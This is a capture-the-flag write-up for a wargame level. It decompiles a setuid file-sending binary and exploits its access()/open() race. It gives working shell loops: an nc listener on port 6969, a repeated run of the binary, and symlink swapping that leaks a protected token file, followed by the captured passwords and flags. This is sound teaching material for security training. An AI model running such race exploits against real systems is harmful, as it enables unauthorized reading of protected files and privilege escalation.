# level10

Our target user is `flag10`. First let's see what we have.

```sh
ls -lA
```

We have these two files:

```
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Let's check what they are:

```sh
file level10 token
```

Output:

```
level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
token:   regular file, no read permission
```

Of course we cannot see what `token` is since we do not have read permission. For now we are going to assume that it's what we want. `level10` is an ELF binary so let's dig into that with Ghidra.

```c
int main(int argc,char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined1 local_1024 [4096];
  sockaddr addr;
  int local_14;

  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];
  iVar2 = access((char *)in_stack_00000008[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    addr.sa_data[2] = '\0';
    addr.sa_data[3] = '\0';
    addr.sa_data[4] = '\0';
    addr.sa_data[5] = '\0';
    addr.sa_data[6] = '\0';
    addr.sa_data[7] = '\0';
    addr.sa_data[8] = '\0';
    addr.sa_data[9] = '\0';
    addr.sa_data[10] = '\0';
    addr.sa_data[0xb] = '\0';
    addr.sa_data[0xc] = '\0';
    addr.sa_data[0xd] = '\0';
    addr.sa_family = 2;
    addr.sa_data[0] = '\0';
    addr.sa_data[1] = '\0';
    addr.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    addr.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&addr,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```

Nothing crazy happening here, just a program that connects to an IPv4 on TCP port 0x1b39 (= 6969) and sends a file.
But before sending the file, it uses `access` to check whether the user some permission on the file.
Let's use `strace` to see the actual permission that is checked:

```sh
strace -e trace=access ./level10 helloworld 0
```

Output:

```
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("helloworld", R_OK)              = -1 ENOENT (No such file or directory)
You don't have access to helloworld
```

Here is part of the DESCRIPTION section of `man 2 access`:

```
access() checks whether the calling process can access the file
pathname.  If pathname is a symbolic link, it is dereferenced.

The mode specifies the accessibility check(s) to be performed, and
is either the value F_OK, or a mask consisting of the bitwise OR
of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the
existence of the file.  R_OK, W_OK, and X_OK test whether the file
exists and grants read, write, and execute permissions,
respectively.
```

We can note two important things:
1. `R_OK` checks whether the user has read permissions on the file
2. Any symbolic link will be dereferenced

This should be enough. We can try doing a [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) (or TOCTOU, for short) attack. This is basically a race condition that results from the non-atomicity of a verification operation (i.e. `access`) regarding an operation that uses the same subject (i.e. `open`). This is highly timing-related so we will probably have to force our way through it. We will need three terminals, running the following:
1. A TCP listener on port 6969, `nc -l` should do the trick
2. A loop executing `level10` until we get the token
3. A loop switching a symbolic link from file we _can_ read to the file we _want_ to read

```sh
# Terminal 1

# in a loop because nc exits after client closes connection
while :; do
    # filter-out prefix .*( )*.
    nc -l 127.0.0.1 6969
done
```

```sh
# Terminal 2

: # reset $? to 0
while :; do
    ./level10 /tmp/link 127.0.0.1
done
```

```sh
# Terminal 3

while :; do
    touch /tmp/dummy
    ln -fs /tmp/dummy /tmp/link
    ln -fs ~/token /tmp/link
done
```

This will yield many errors but ultimately print the token:

Terminal 1:

```
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
^C
```

Terminal 2:
```
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/link
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
^C
```

Let's try the password:

```
flag10@localhost's password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```

```sh
getflag
```

Output:

```
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

Checking the flag:

```
level11@localhost's password: feulo4b72j7edeahuete3no7c
```

All good.
